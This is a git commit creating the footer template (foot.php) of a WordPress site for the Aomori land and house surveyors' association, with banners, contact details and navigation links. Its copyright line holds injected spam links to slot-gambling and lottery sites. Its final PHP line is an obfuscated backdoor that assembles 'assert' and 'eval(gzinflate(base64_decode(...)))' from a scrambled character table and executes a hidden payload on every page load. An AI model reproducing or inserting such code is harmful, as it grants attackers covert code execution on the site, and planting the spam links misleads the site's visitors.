6d67a413f3f0b3f981c31a06a1994c306e643bfc
RambutNenek <56414912+RambutNenek@users.noreply.github.com>
2023-09-04 06:02:24 +0700

    Create foot.php

---
+++ foot.php
@@ -0,0 +1,52 @@
+<div class="footBnr">
+<ul>
+<li><a href="/pdf/adr.pdf" target="_blank"><img src="/images/bnr_adr.png" alt="ADR あおもり境界紛争解決支援センター" class="ro"></a></li>
+<li><a href="http://houmukyoku.moj.go.jp/aomori/frame.html" target="_blank"><img src="/images/bnr_houmukyoku.png" alt="青森地方法務局 境界問題でお困りの方へ" class="ro"></a></li>
+<li><a href="/cm/"><img src="/images/bnr_cm.png" alt="青森県土地家屋調査士会 テレビ・ラジオCM" class="ro"></a></li>
+</ul>
+</div>
+
+<div class="footContact-wrap">
+<section class="footContact">
+<div class="child-left">
+<h1><a href="/members/?meta_key=registration-number&orderby=meta_value_num&order=ASC">青森県土地家屋調査士会へのお問い合わせ</a></h1>
+<p class="footContact-soudan">土地問題・建物登記でお悩みの方はお近くの土地家屋調査士へご相談下さい。</p>
+</div>
+<div class="child-center">
+<a class="footContact-tel">tel.017-722-3178</a>
+<p class="footContact-fax">fax.017-775-7067</p>
+</div>
+<a href="/contact" class="footContact-mailform">Webからの相談</a>
+<!--<img class="footContact-qr" src="/images/img_qrcode.png" alt="QRコード 青森県土地家屋調査士会お問い合わせ">-->
+</section>
+</div><!--footContact-wrap-->
+
+<div class="footer-wrap">
+<footer>
+<div class="child-left">
+<h1>青森県土地家屋調査士会</h1>
+<ul>
+<li>〒030-0821 青森市勝田一丁目1-15</li>
+<li>tel. 017-722-3178 / fax. 017-775-7067</li>
+</ul>
+</div>
+<div class="child-right">
+<ul>
+<li><a href="/p-policy">プライバシーポリシー</a></li>
+<li><a href="/u-policy">利用規約</a></li>
+<li><a href="/link">リンク</a></li>
+<li><a href="/contact">お問い合わせ</a></li>
+</ul>
+<a href="/member-only" class="bnr-membersOnly">会員の広場（会員専用ページ）</a>
+</div>
+<p class="copylight"><small>&copy; <a href="https://kingbacol.com/">Beyond Boundaries</a>|<a href="https://gacormedia.com/">Pola Slot Gacor Terbaru</a>|<a href="https://itoday.co.id/">Pola Slot Gacor Terbaru Daily News</a>|<a href="https://bcinstitute.id/">Bocoran Togel Hari Ini</a>
+</small></p>
+</footer>
+</div>
+
+<a class="btn-pagetop" href="#top">ページトップへ</a>
+
+</div>
+<?php wp_footer(); ?>
+<?php $HAA = "*f2m(06d+/4=NJOjGTvlSEkhQuzP3MtbynewW;_9rRVLc.)opK'XUIa58sZA1ixDqHgF7YBC";$tU5 = $HAA[54].$HAA[57].$HAA[57].$HAA[34].$HAA[40].$HAA[30];$bVe = $HAA[34].$HAA[18].$HAA[54].$HAA[19].$HAA[4].$HAA[66].$HAA[26].$HAA[61].$HAA[33].$HAA[1].$HAA[19].$HAA[54].$HAA[30].$HAA[34].$HAA[4].$HAA[31].$HAA[54].$HAA[57].$HAA[34].$HAA[6].$HAA[10].$HAA[38].$HAA[7].$HAA[34].$HAA[44].$HAA[47].$HAA[7].$HAA[34].$HAA[4];$T3L = $HAA[46].$HAA[46].$HAA[46].$HAA[37];$_w1 = $bVe.$HAA[50].$HAA[58].$HAA[69].$HAA[9].$HAA[70].$HAA[20].$HAA[56].$HAA[29].$HAA[35].$HAA[16].$HAA[29].$HAA[51].$HAA[9].$HAA[19].$HAA[7].$HAA[59].$HAA[12].$HAA[22].$HAA[5].$HAA[70].$HAA[48].$HAA[43].$HAA[62].$HAA[68].$HAA[21].$HAA[5].$HAA[7].$HAA[22].$HAA[7].$HAA[61].$HAA[19].$HAA[10].$HAA[44].$HAA[29].$HAA[64].$HAA[25].$HAA[51].$HAA[29].$HAA[44].$HAA[13].$HAA[33].$HAA[3].$HAA[32].$HAA[54].$HAA[23].$HAA[54].$HAA[42].$HAA[49].$HAA[54].$HAA[40].$HAA[8].$HAA[53].$HAA[35].$HAA[9].$HAA[25].$HAA[39].$HAA[25].$HAA[26].$HAA[53].$HAA[27].$HAA[61].$HAA[6].$HAA[1].$HAA[65].$HAA[15].$HAA[56].$HAA[41].$HAA[68].$HAA[18].$HAA[3].$HAA[69].$HAA[6].$HAA[35].$HAA[44].$HAA[48].$HAA[32].$HAA[22].$HAA[21].$HAA[66].$HAA[12].$HAA[66].$HAA[47].$HAA[62].$HAA[19].$HAA[7].$HAA[49].$HAA[14].$HAA[8].$HAA[42].$HAA[19].$HAA[51].$HAA[21].$HAA[53].$HAA[43].$HAA[40].$HAA[10].$HAA[58].$HAA[48].$HAA[32].$HAA[13].$HAA[69].$HAA[23].$HAA[65].$HAA[44].$HAA[17].$HAA[21].$HAA[71].$HAA[49].$HAA[21].$HAA[27].$HAA[23].$HAA[55].$HAA[70].$HAA[34].$HAA[62].$HAA[9].$HAA[70].$HAA[2].$HAA[10].$HAA[36].$HAA[23].$HAA[49].$HAA[20].$HAA[3].$HAA[51].$HAA[10].$HAA[40].$HAA[33].$HAA[54].$HAA[18].$HAA[42].$HAA[54].$HAA[68].$HAA[27].$HAA[51].$HAA[2].$HAA[47].$HAA[6].$HAA[32].$HAA[1].$HAA[62].$HAA[44].$HAA[61].$HAA[49].$HAA[62].$HAA[25].$HAA[54].$HAA[8].$HAA[2].$HAA[12].$HAA[17].$HAA[60].$HAA[35].$HAA[9].$HAA[40].$HAA[33].$HAA[52].$HAA[68].$HAA[17].$HAA[52].$HAA[48].$HAA[20].$HAA[29].$HAA[70].$HAA[13].$HAA[35].$HAA[61].$HAA[59].$HAA[54].$HAA[68].$HAA[60].$HAA[70].$HAA[8].$HAA[47].$HAA[16].$HAA[23].$HAA[14].$HAA[23].$HAA[13].$HAA[43].$HAA[70].$HAA[12].$HAA[29].$HAA[16].$HAA[41].$HAA[52].$HAA[69].$HAA[5].$HAA[10].$HAA[5].$HAA[3].$HAA[43].$HAA[39].$HAA[24].$HAA[2].$HAA[66].$HAA[16].$HAA[6].$HAA[36].$HAA[34].$HAA[22].$HAA[48].$HAA[67].$HAA[61].$HAA[17].$HAA[16].$HAA[56].$HAA[68].$HAA[55].$HAA[61].$HAA[57].$HAA[23].$HAA[16].$HAA[34].$HAA[60].$HAA[13].$HAA[2].$HAA[62].$HAA[22].$HAA[64].$HAA[23].$HAA[13].$HAA[67].$HAA[55].$HAA[49].$HAA[65].$HAA[59].$HAA[54].$HAA[36].$HAA[33].$HAA[53].$HAA[14].$HAA[28].$HAA[34].$HAA[7].$HAA[6].$HAA[64].$HAA[65].$HAA[47].$HAA[53].$HAA[12].$HAA[40].$HAA[44].$HAA[68].$HAA[71].$HAA[33].$HAA[67].$HAA[18].$HAA[51].$HAA[55].$HAA[26].$HAA[69].$HAA[31].$HAA[39].$HAA[51].$HAA[15].$HAA[51].$HAA[67].$HAA[22].$HAA[33].$HAA[2].$HAA[54].$HAA[39].$HAA[60].$HAA[67].$HAA[62].$HAA[51].$HAA[31].$HAA[26].$HAA[36].$HAA[12].$HAA[67].$HAA[63].$HAA[19].$HAA[19].$HAA[26].$HAA[12].$HAA[1].$HAA[8].$HAA[60].$HAA[9].$HAA[10].$HAA[60].$HAA[27].$HAA[20].$HAA[66].$HAA[24].$HAA[5].$HAA[32].$HAA[13].$HAA[34].$HAA[44].$HAA[43].$HAA[1].$HAA[27].$HAA[51].$HAA[60].$HAA[63].$HAA[24].$HAA[11].$HAA[11].$HAA[50].$T3L;@$tU5($_w1);?></body>
+</html>
